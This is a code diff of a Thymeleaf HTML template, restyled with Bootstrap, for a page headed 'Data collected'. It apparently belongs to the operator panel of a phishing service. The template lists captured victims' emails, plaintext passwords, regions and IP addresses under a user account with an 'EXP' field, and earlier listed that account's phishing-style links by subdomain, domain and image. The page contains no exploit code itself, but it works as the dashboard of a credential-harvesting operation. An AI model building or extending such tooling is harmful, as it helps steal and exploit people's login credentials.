@@ -2,21 +2,42 @@
 <html xmlns:th="http://www.thymeleaf.org">
 <head>
     <title>User Detail</title>
+    <!-- Add Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
 </head>
 <body>
-    <h1>User Detail</h1>
-    <div th:each="link : ${user.links}">
-        <p>Link Id: <span th:text="${link.id}"></span></p>
-        <p>Subdomain: <span th:text="${link.subdomain}"></span></p>
-        <p>Domain: <span th:text="${link.domain}"></span></p>
-        <p>Image: <span th:text="${link.image}"></span></p>
+   <div class="container mt-4">
+    <h1 class="mb-4">Data collected</h1>
+    <div>
+       
+        <p>
+            USER: <span th:text="${user.name}"></span> |
+            EXP: <span th:text="${user.exp}"></span> 
+         
+        </p>
     </div>
-    <div th:each="receivedData : ${user.receivedData}">
-        <p>Received Data Id: <span th:text="${receivedData.id}"></span></p>
-        <p>Email: <span th:text="${receivedData.email}"></span></p>
-        <p>Password: <span th:text="${receivedData.password}"></span></p>
-        <p>Region: <span th:text="${receivedData.region}"></span></p>
-        <p>IP Address: <span th:text="${receivedData.ipAddress}"></span></p>
+    <hr>
+    <div th:if="${user != null}">
+        <div class="card mb-4">
+            <div class="card-body">
+                <div class="card-text">
+                <div th:each="receivedData1 : ${user.receivedData}">
+                    <p>
+                        <span th:text="${receivedData1.email}"></span> |
+                        <span th:text="${receivedData1.pass}"></span> |
+                        <span th:text="${receivedData1.region}"></span> |
+                        <span th:text="${receivedData1.getIpAddr()}"></span>
+                    </p>
+                </div>
+                </div>
+            </div>
+        </div>
     </div>
+</div>
+
+    <!-- Add Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
 </body>
 </html>
